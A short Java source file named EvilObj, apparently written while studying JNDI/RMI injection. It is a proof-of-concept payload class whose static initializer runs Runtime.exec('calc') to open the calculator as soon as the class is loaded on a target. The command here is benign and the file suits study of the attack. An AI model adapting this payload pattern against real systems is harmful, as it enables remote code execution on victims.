package com.spring.rmi;

/**
 * @Author 王景辉
 * @Site
 * @Create 2022-05-24-9:30
 **/
public class EvilObj {
    static {
        System.out.println("在哪里执行的");
        System.out.println("执行脚本");
        System.out.println("jndi注入");
        try {
            //打开系统计算器
            Process pro = Runtime.getRuntime().exec("calc " );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
